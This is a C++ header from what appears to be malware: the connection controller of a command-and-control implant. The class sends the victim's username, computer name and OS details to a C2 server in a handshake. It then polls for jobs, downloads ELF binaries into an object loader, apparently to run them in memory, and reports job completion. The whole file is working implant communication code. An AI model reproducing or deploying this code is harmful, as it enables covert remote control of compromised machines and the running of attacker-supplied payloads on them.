#include "stdafx.h"


using namespace std;

#ifndef CONNECTION_CONTROLLER_H
#define CONNECTION_CONTROLLER_H

#include "HttpRequest.hpp"
#include "JSONParser.h"
#include "C2Config.h"
#include "ServerResponse.h"
#include "ObjectLoader.h"

class ConnectionController {
private:
    pthread_mutex_t mutex; // Mutex object for when CC is used in a thread.
    const char* IMPLANT_ID = "FAKE_ID";
    string computername, username, osInfo;
    string JOB_ID = "NO_JOB";
    int OBJECT_SIZE = 0;

    json::JSON httpPOST(const char* URL, const char* body) {
        try {
            http::Request requestPOST{URL};
            const auto response = requestPOST.send("POST", body, {
                {"Content-Type", "application/json"}
            });
            
            return json::parse(string{response.body.begin(), response.body.end()});
        } catch (const std::exception e) {
            return json::null();
        }
    }

    json::JSON httpGET(const char* URL) {

        try {
            http::Request requestGET(URL);
            const auto response = requestGET.send("GET");
            return json:: parse(string{response.body.begin(), response.body.end()});

        } catch (const std::exception e) {

            return json::null();
        }  
    }

    bool downloadFile(const char* URL, ObjectLoader* loader) {

        bool downloaded = false;
        http::Request requestGET(URL);

        try {

            const auto response = requestGET.send("GET");
            if (!(response.body.at(0) == 0x7f && response.body.at(1) == 0x45 &&
                response.body.at(2) == 0x4c && response.body.at(3) == 0x46)) {
                
                printf("Failed to retrieve job object!\n");
                downloaded = false;
                goto end;
            }

            for (int i = 0; i < response.body.size(); i++) {
                loader->writeObject(response.body.at(i));
            }

            downloaded = true;

        } catch (const std::exception e) {
            printf("Failed to download the object!\n");
            downloaded = false;
            goto end;
        }
end:
        return downloaded;
    }

    const char* prepareHandShakeBody() {

        const char* templateStr = "{\"username\":\"%s\", \"computername\":\"%s\", \"info\":\"%s\", \"id\":\"%s\"}";

        int bodyLen = strlen(this->IMPLANT_ID) + this->computername.length() + 
            this->username.length() + this->osInfo.length() + strlen(templateStr);

        char* bodyInit = new char[bodyLen];
        snprintf(bodyInit, bodyLen, templateStr, this->username.c_str(), this->computername.c_str(), this->osInfo.c_str(), this->IMPLANT_ID);
                
        return bodyInit;
    }

    char* prepareJobURL() {
        int urlLen = this->JOB_ID.length() + strlen(URL_JOB);
        char* urlJob = new char[urlLen];
        snprintf(urlJob, urlLen, URL_JOB, this->JOB_ID.c_str());

        return urlJob;
    }

    char* prepareJobBody(int code) {
        string status = to_string(code);

        char* jobBody = new char[status.length() + strlen(BODY_JOB)];
        snprintf(jobBody, status.length() + strlen(BODY_JOB), BODY_JOB, status.c_str());

        return jobBody;
    }

    char* preparePingURL() {
        char* pingUrl = new char[strlen(this->IMPLANT_ID) + strlen(URL_PING)];
        snprintf(pingUrl, strlen(this->IMPLANT_ID) + strlen(URL_PING), URL_PING, 
            this->IMPLANT_ID);

        return pingUrl;
    }

public:
    ConnectionController(const char* id) {
        this->IMPLANT_ID = id;
    }

    void prepareConnection(string computername, string username, string osInfo) {
        this->computername = computername;
        this->username = username;
        this->osInfo = osInfo;
    }

    // The inital connection handshake.
    int handShake() {

        printf("Perform handshake with C2 server with ID %s\n", this->IMPLANT_ID);
        json::JSON responseBody = httpPOST(URL_INIT, prepareHandShakeBody());
        if (responseBody.size() <= 0) {
            return RESPONSE_ERROR;
        }

        // Get the status code from response.
        int code = json::getInt("code", responseBody);
        if (code == RESPONSE_NEW_OBJECT) {
            // Parse the job ID and object size.
            this->JOB_ID = json::getStr("id", responseBody);
            this->OBJECT_SIZE = json::getInt("size", responseBody);
        }

        return code;    
    }

    // Check if there is a new object for us to execute.
    int checkNewJob() {

        json::JSON responseBody = httpGET(preparePingURL());
        if (responseBody.size() <= 0) {
            return RESPONSE_NO_RES;
        }

        // If there is a new object, set the values.
        int code = json::getInt("code", responseBody);
        if (code == RESPONSE_NEW_OBJECT) {
            this->JOB_ID = json::getStr("id", responseBody);
            this->OBJECT_SIZE = json::getInt("size", responseBody);
        }

        return code;
    }

    // Sends finish request to the server to let know we finished executing the job.
    int finishJob(int code) {

        // Creat URL with job ID.
        char* urlJob = prepareJobURL();
        json::JSON responseBody = httpPOST(urlJob, prepareJobBody(code));
        if (responseBody.size() <= 0) {
            return RESPONSE_ERROR;
        }

        // Cleanup job for the next one.
        this->OBJECT_SIZE = 0;
        this->JOB_ID = "NO_JOB";

        return json::getInt("code", responseBody);
    }

    // Getter for job ID.
    string getJobId() {
        return this->JOB_ID;
    }

    // Retrieves the actual object from the server.
    bool getObject(ObjectLoader *loader) {

        pthread_mutex_lock(&mutex);

        if (this->OBJECT_SIZE <= 0 || this->JOB_ID.length() == 0) {
            printf("No job available currently!\n");
            return false;
        }

        // Prepare memory loaders.
        if (!loader->prepareObject(OBJECT_SIZE)) {
            printf("Failed to prepare object!\n");
            return false;
        }

        // Load object data to object loader.
        bool downloaded = downloadFile(prepareJobURL(), loader);

        pthread_mutex_unlock(&mutex);
        return downloaded;
    }

    bool sendJobList(vector<string> jobList) {

        printf("# All active jobs:\n");

        for (int i = 0; i < jobList.size(); i++) {

            printf("%s\n", jobList.at(i).c_str());
        }

        return true;
    }
};

#endif // !~ CONNECTION_CONTROLLER_H 